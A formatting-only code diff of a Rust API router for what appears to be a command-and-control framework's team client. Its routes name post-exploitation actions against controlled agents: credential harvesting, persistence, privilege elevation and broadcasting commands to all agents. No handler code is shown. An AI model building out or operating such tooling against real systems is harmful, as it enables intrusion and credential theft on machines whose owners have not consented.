@@ -1,5 +1,5 @@
 //! Team Client API Module
-//! 
+//!
 //! This module provides a REST/WebSocket API for team clients to communicate
 //! with the C2R2 server. This is similar to how Havoc C2 and other modern
 //! C2 frameworks handle team client communication.
@@ -20,11 +20,11 @@ pub use models::*;
 pub use state::*;
 
 use axum::{
-    Router,
     routing::{get, post},
+    Router,
 };
-use tower_http::cors::{CorsLayer, Any};
 use std::sync::Arc;
+use tower_http::cors::{Any, CorsLayer};
 
 /// Create the API router with all endpoints
 pub fn create_api_router(state: Arc<ApiState>) -> Router {
@@ -43,9 +43,15 @@ pub fn create_api_router(state: Arc<ApiState>) -> Router {
         .route("/api/agents/:id/listdir", post(handlers::list_directory))
         .route("/api/agents/:id/cd", post(handlers::change_directory))
         .route("/api/agents/:id/pwd", post(handlers::get_cwd))
-        .route("/api/agents/:id/harvest", post(handlers::harvest_credentials))
+        .route(
+            "/api/agents/:id/harvest",
+            post(handlers::harvest_credentials),
+        )
         .route("/api/agents/:id/persist", post(handlers::set_persistence))
-        .route("/api/agents/:id/persist_remove", post(handlers::remove_persistence))
+        .route(
+            "/api/agents/:id/persist_remove",
+            post(handlers::remove_persistence),
+        )
         .route("/api/agents/:id/beacon", post(handlers::configure_beacon))
         .route("/api/agents/:id/elevate", post(handlers::elevate_agent))
         .route("/api/agents/all/cmd", post(handlers::send_command_all))
